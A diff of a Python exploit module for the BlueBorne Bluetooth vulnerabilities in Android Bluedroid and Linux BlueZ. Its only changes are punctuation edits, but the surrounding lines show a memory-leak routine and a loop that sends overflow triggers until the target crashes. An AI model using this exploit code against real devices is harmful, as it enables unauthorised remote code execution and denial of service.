@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
-# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
+# Author: André Henrique (@mrhenrike) | União Geek - https://github.com/Uniao-Geek
 """Native BlueBorne attack module (CVE-2017-0781, CVE-2017-0785, CVE-2017-1000251).
 
 Implements the BlueBorne Bluetooth vulnerability chain natively:
-  - SDP Information Leak (CVE-2017-0785): integer underflow in Android Bluedroid
+ - SDP Information Leak (CVE-2017-0785): integer underflow in Android Bluedroid
     SDP handler leaks stack memory via continuation state confusion.
-  - BNEP Heap Overflow (CVE-2017-0781): heap corruption in Android BNEP handler
+ - BNEP Heap Overflow (CVE-2017-0781): heap corruption in Android BNEP handler
     via crafted control messages, leading to RCE.
-  - L2CAP Stack Overflow (CVE-2017-1000251): Linux BlueZ kernel buffer overflow
+ - L2CAP Stack Overflow (CVE-2017-1000251): Linux BlueZ kernel buffer overflow
     in l2cap_parse_conf_rsp via oversized EFS config elements.
 
 Requires: Linux with BlueZ, pybluez, scapy[bluetooth].
@@ -42,7 +42,7 @@ import socket as _bt_socket
 _AF_BLUETOOTH = 31
 _BTPROTO_L2CAP = 0
 _BTPROTO_RFCOMM = 3
-HAS_PYBLUEZ = True  # native sockets — no pybluez needed
+HAS_PYBLUEZ = True  # native sockets - no pybluez needed
 
 try:
     from scapy.layers.bluetooth import (
@@ -118,7 +118,7 @@ def _sdp_unpack_search_response(data: bytes) -> dict[str, Any]:
 
 @requires_os(OSRequirement.LINUX_ONLY)
 class Exploit(Exploit):
-    """Native BlueBorne attack — SDP info leak + BNEP heap overflow."""
+    """Native BlueBorne attack - SDP info leak + BNEP heap overflow."""
 
     __info__ = {
         "name": "BlueBorne Attack (CVE-2017-0781/0785/1000251)",
@@ -127,7 +127,7 @@ class Exploit(Exploit):
             "SDP info leak extracts ASLR bases from Android Bluedroid stack. "
             "BNEP heap overflow achieves code execution via heap corruption. "
             "L2CAP stack overflow targets Linux BlueZ kernel. "
-            "No external tools — pure Python with pybluez/scapy."
+            "No external tools - pure Python with pybluez/scapy."
         ),
         "authors": (
             "André Henrique (@mrhenrike) | União Geek",
@@ -183,7 +183,7 @@ class Exploit(Exploit):
             sock.send(_sdp_pack_search_request(L2CAP_UUID))
             response = _sdp_unpack_search_response(sock.recv(4096))
             if not response.get("cstate") or response["cstate"] == b"\x00":
-                print_error("No continuation state received — target may not be vulnerable.")
+                print_error("No continuation state received - target may not be vulnerable.")
                 return []
 
             print_status(f"Got continuation state, starting {self.leak_rounds} leak rounds...")
@@ -254,12 +254,12 @@ class Exploit(Exploit):
         for i in range(self.overflow_attempts):
             _, writable, _ = select.select([], [sock], [], self.pwn_timeout)
             if not writable:
-                logger.info("Target socket became non-writable at attempt %d — possible crash", i)
+                logger.info("Target socket became non-writable at attempt %d - possible crash", i)
                 return True
             try:
                 sock.send(trigger)
             except Exception as err:
-                logger.info("Send failed at attempt %d: %s — possible crash", i, err)
+                logger.info("Send failed at attempt %d: %s - possible crash", i, err)
                 return True
 
         return False
@@ -282,7 +282,7 @@ class Exploit(Exploit):
             crashed = self._bnep_trigger_overflow(sock)
 
             if crashed:
-                print_success("Target appears to have crashed — overflow triggered successfully.")
+                print_success("Target appears to have crashed - overflow triggered successfully.")
             else:
                 print_info("All attempts sent but no crash detected.")
 
@@ -366,7 +366,7 @@ class Exploit(Exploit):
     def run(self) -> None:
         """Execute BlueBorne attack."""
         if not HAS_PYBLUEZ:
-            pass  # native socket — always available
+            pass  # native socket - always available
             return
 
         if not self.target_address:
